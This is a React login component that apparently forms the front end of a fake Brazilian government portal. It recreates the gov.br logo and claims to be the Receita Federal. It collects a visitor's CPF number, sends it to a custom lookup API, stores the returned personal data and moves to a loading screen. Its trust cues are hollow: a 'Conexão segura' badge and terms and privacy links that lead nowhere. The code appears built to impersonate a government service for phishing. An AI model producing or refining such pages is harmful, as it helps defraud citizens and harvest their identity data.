import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { Lock, ShieldCheck } from 'lucide-react';
import { Button } from './ui/button';
import { Input } from './ui/input';
import { Card, CardContent } from './ui/card';
import { cpfService } from '../services/api';
import { useToast } from '../hooks/use-toast';
import { Toaster } from './ui/toaster';

const LoginCard = () => {
  const [cpf, setCpf] = useState('');
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();
  const { toast } = useToast();

  const formatCPF = (value) => {
    const numbers = value.replace(/\D/g, '');
    if (numbers.length <= 11) {
      return numbers
        .replace(/(\d{3})(\d)/, '$1.$2')
        .replace(/(\d{3})(\d)/, '$1.$2')
        .replace(/(\d{3})(\d{1,2})$/, '$1-$2');
    }
    return cpf;
  };

  const handleCpfChange = (e) => {
    const formatted = formatCPF(e.target.value);
    setCpf(formatted);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    if (!cpf || cpf.length < 14) {
      toast({
        title: "Erro",
        description: "Por favor, digite um CPF válido",
        variant: "destructive"
      });
      return;
    }

    setLoading(true);
    try {
      // Consultar CPF na API
      const result = await cpfService.consultar(cpf);
      
      if (result.success) {
        // Salvar dados no localStorage
        localStorage.setItem('userData', JSON.stringify(result.data));
        // Navegar para tela de loading
        navigate('/loading');
      } else {
        toast({
          title: "Erro",
          description: "CPF não encontrado",
          variant: "destructive"
        });
      }
    } catch (error) {
      console.error('Erro ao consultar CPF:', error);
      toast({
        title: "Erro",
        description: "Erro ao consultar CPF. Tente novamente.",
        variant: "destructive"
      });
    } finally {
      setLoading(false);
    }
  };

  return (
    <>
      <Card className="w-full max-w-md mx-auto shadow-xl bg-white rounded-2xl">
        <CardContent className="p-8">
          {/* Logo gov.br */}
          <div className="text-center mb-6">
            <div className="inline-flex items-center justify-center mb-4">
              <span className="text-5xl font-bold text-blue-600">g</span>
              <span className="text-5xl font-bold text-orange-500">o</span>
              <span className="text-5xl font-bold text-blue-600">v</span>
              <span className="text-5xl font-bold text-green-500">.</span>
              <span className="text-5xl font-bold text-blue-600">b</span>
              <span className="text-5xl font-bold text-orange-500">r</span>
            </div>
            <h2 className="text-2xl font-bold text-gray-800 mb-1">CPF Brasil</h2>
            <p className="text-gray-600 text-sm">Receita Federal do Brasil</p>
          </div>

          {/* Aviso de Termos */}
          <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
            <div className="flex items-start space-x-2">
              <ShieldCheck className="w-5 h-5 text-blue-600 mt-0.5 flex-shrink-0" />
              <p className="text-sm text-blue-900">
                Ao prosseguir, você concorda com nossos{' '}
                <a href="#" className="text-blue-600 hover:underline font-medium">
                  Termos de Uso
                </a>{' '}
                e{' '}
                <a href="#" className="text-blue-600 hover:underline font-medium">
                  Política de privacidade
                </a>
                .
              </p>
            </div>
          </div>

          {/* Formulário */}
          <form onSubmit={handleSubmit}>
            <div className="mb-6">
              <label htmlFor="cpf" className="block text-sm font-medium text-gray-700 mb-2">
                Digite seu CPF para acessar
              </label>
              <Input
                id="cpf"
                type="text"
                value={cpf}
                onChange={handleCpfChange}
                placeholder="000.000.000-00"
                maxLength="14"
                className="w-full h-12 text-center text-lg tracking-wider"
                disabled={loading}
              />
            </div>

            <Button
              type="submit"
              disabled={loading}
              className="w-full h-12 bg-blue-600 hover:bg-blue-700 text-white font-semibold text-base rounded-lg transition-colors disabled:opacity-50"
            >
              {loading ? (
                <>
                  <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white mr-2" />
                  CONSULTANDO...
                </>
              ) : (
                <>
                  <Lock className="w-5 h-5 mr-2" />
                  ENTRAR COM GOV.BR
                </>
              )}
            </Button>
          </form>

          {/* Conexão Segura */}
          <div className="mt-6 text-center">
            <div className="inline-flex items-center text-gray-500 text-sm">
              <Lock className="w-4 h-4 mr-1" />
              <span>Conexão segura</span>
            </div>
          </div>
        </CardContent>
      </Card>
      <Toaster />
    </>
  );
};

export default LoginCard;